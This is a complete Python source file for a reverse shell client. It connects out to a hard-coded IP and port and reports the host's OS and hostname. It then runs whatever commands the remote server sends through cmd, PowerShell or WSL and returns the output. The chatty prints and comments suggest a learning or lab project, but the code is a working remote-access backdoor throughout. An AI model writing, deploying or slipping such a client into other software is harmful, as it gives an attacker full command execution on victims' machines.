#!/usr/bin/env python3

"""
Reverse Shell client
# -----------------------------------------------------------------
# This client connects to a reverse shell server and executes commands received from the server.
# It sends the output back to the server.
"""

import socket  # for networking (creating client socket)
import os   # for executing system commands
import subprocess  # for executing system commands
import sys  # for system exit
import platform
import time

#server configuration. Set localhost to connect to the server running on the same machine.
SERVER_IP = "192.168.1.53"
SERVER_PORT = 9999  # Port to connect to the server

# System Info class
# -----------------------------------------------------------------
# This class gathers and stores system information such as OS, machine type, hostname, release, and version.
# It also checks if PowerShell and WSL are available on Windows systems.
# -----------------------------------------------------------------
class SystemInfo:
    def __init__(self, os_info, machine_info, node_name, release, version):
        self.os_info = os_info  # Operating system (e.g., Windows, Linux, Darwin)
        self.machine_info = machine_info  # Machine type (e.g., x86_64, ARM)
        self.node_name = node_name  # Hostname of the machine
        self.release = release  # OS release version
        self.version = version  # OS version
        
        self.iswindows = (os_info == "windows")  # Check if the OS is Windows
        self.powershell_available = False  # Flag to check if PowerShell is available
        self.wsl_available = False

        #select the shell where to execute the commands
        self.shell = "cmd"        

            
    def __str__(self):
        if self.iswindows:
            return (
                f"System Info\n"
                f"  OS: {self.os_info}\n"
                f"  Machine: {self.machine_info}\n"
                f"  Hostname: {self.node_name}\n"
                f"  Release: {self.release}\n"
                f"  Version: {self.version}\n"
                f"  PowerShell Available: {self.powershell_available}\n"
                f"  WSL Available: {self.wsl_available}"
            )
        return (
            f"System Info\n"
            f"  OS: {self.os_info}\n"
            f"  Machine: {self.machine_info}\n"
            f"  Hostname: {self.node_name}\n"
            f"  Release: {self.release}\n"
            f"  Version: {self.version}"
        )

        



# Function to gather system information
# -----------------------------------------------------------------
def get_system_info():
    print ("Gathering system information...")
    
    # Gather system information 
    systemInfo = SystemInfo(
        os_info=platform.system().lower(),  # Operating system (e.g., Windows, Linux, Darwin)
        machine_info=platform.machine(),  # Machine type (e.g., x86_64, ARM)
        node_name=platform.node(),  # Hostname of the machine
        release=platform.release(),  # OS release version
        version=platform.version()  # OS version
    )

    # check if the OS is Windows
    if systemInfo.os_info == "windows":
        # Check if PowerShell is available
        try:
            # Check if PowerShell is available
            subprocess.run(["powershell", "-Command", "echo 'PowerShell is available'"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print("PowerShell is available.")
            systemInfo.powershell_available = True  # Set the flag to True if PowerShell is available
        except subprocess.CalledProcessError:
            print("PowerShell is not available.")
        # check if wsl is available
        try:
            # Check if WSL is available
            subprocess.run(["wsl", "--list"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print("WSL is available.")
            systemInfo.wsl_available = True  # Set the flag to True if WSL is available
        except subprocess.CalledProcessError:
            print("WSL is not available.")

    # Print system information
    print(f"System Information:\n{systemInfo}")
    return systemInfo  # Return the system information object



def main():

    systemInfo = get_system_info()  # Get system information
    
    # Create a socket using IPv4 (AF_INET) and TCP (SOCK_STREAM)
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Start client...")
    try:
        # Connect to the server
        client_socket.connect((SERVER_IP, SERVER_PORT))
        print(f"Connected to server at {SERVER_IP}:{SERVER_PORT}")

        print("Sending system information...")

        # Create a message with system details
        system_details = f"System Information:\n{systemInfo}"  # Format the system information as a string
        # Send system details to the server
        client_socket.send(system_details.encode())

        # Send special commands allowed by the client
        if systemInfo.iswindows:
            client_socket.send(b"Working on windows shell")
            client_socket.send(b"You can use other shells like PowerShell and WSL if available. Use the following to switch:\n")
            client_socket.send(b"!usecmd\n")  # Send cmd command to the server
            client_socket.send(b"!usepowershell\n")  # Send PowerShell command to the server
            client_socket.send(b"!usewsl\n")  # Send WSL command to the server


    except Exception as e:
        print(f"Connection Failed: {e}")
        sys.exit(1) # Exit if connection fails

    while True:
        try:
            # Receive command from the server
            data = client_socket.recv(1024)
            if not data:
                break  # Exit if no data is received
            print("Decoding command...")
            command=data.decode("utf-8", errors="ignore")  # Decode the command received from the server
            print(f"Command received: {command}")
            
            if command.lower() == "!usecmd":
                # Use cmd command
                print("Requested cmd...")
                systemInfo.shell = "cmd"
                output = "cmd shell activated."
            elif command.lower() == "!usepowershell":
                # Use PowerShell command
                print("Requested PowerShell...")
                if systemInfo.powershell_available:
                    # switch to PowerShell
                    output = "PowerShell shell activated."
                    systemInfo.shell = "powershell"  # Set the shell to PowerShell
                else:
                    output = "PowerShell is not available on this system."
            elif command.lower() == "!usewsl":
                # Use WSL command
                print("Requested WSL...")
                if systemInfo.wsl_available:
                    # switch to WSL
                    systemInfo.shell = "wsl"  # Set the shell to WSL
                    output = "WSL shell activated."
                else:
                    output = "WSL is not available on this system."    

            elif command.startswith("cd "):
                # Change directory command
                try:
                    os.chdir(command.strip("cd "))  # Change the current working directory
                    output = "" 
                except Exception as e:
                    output= f"Error changing directory: {e}"
            else:
                #Run the command with subprocessor
                print("Executing command...")

                # execute the command in the selected shell
                if systemInfo.shell == "cmd":
                    command = f"{command}"
                elif systemInfo.shell == "powershell":
                    command = f"powershell -Command {command}"
                elif systemInfo.shell == "wsl":
                    command = f"wsl {command}"
                else:
                    command = f"cmd /c {command}"

                # Execute the command and capture the output
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout, stderr = process.communicate()  # Communicate with the process
                print("Command executed")
                print("stdout",stdout.decode(errors="ignore"))
                print("stderr",stderr.decode(errors="ignore"))
                output = stdout.decode(errors="ignore") + stderr.decode(errors="ignore")  # Decode the output and error messages
                print("End of command execution")
                print (f"Output: {output}")

            #Append the currend working directory to the output
            current_directory = os.getcwd()  # Get the current working directory
            final_output = f"{output}\n[{systemInfo.shell}] {current_directory} > "  # Append the current directory to the output
            print(f"Final output: {final_output}")
            client_socket.send(final_output.encode())  # Send the output back to the server
        except Exception as e:
            print(f"Error: {e}")
            break
    
            
    # Close the socket when done
    client_socket.close()

    print("Connection closed.")
    sys.exit(0)  # Exit the program successfully


if __name__ == "__main__":
    main()
    
